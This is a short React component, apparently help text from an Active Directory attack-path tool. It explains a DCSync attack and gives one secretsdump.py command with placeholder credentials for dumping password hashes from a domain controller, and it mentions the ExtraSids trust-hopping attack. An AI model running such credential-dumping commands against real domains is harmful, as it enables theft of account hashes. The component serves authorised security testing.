import React from 'react';

const LinuxAbuse = () => {
    return (
        <>
            <p>
                You may perform a dcsync attack to get the password hash of an
                arbitrary principal using impacket's secretsdump.py example script:
            </p>

            <pre>
                <code>
                    {
                        "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"
                    }
                </code>
            </pre>

            <p>
                You can also perform the more complicated ExtraSids attack to
                hop domain trusts. For information on this see the blog post by
                harmj0y in the references tab.
            </p>
        </>
    );
};

export default LinuxAbuse;
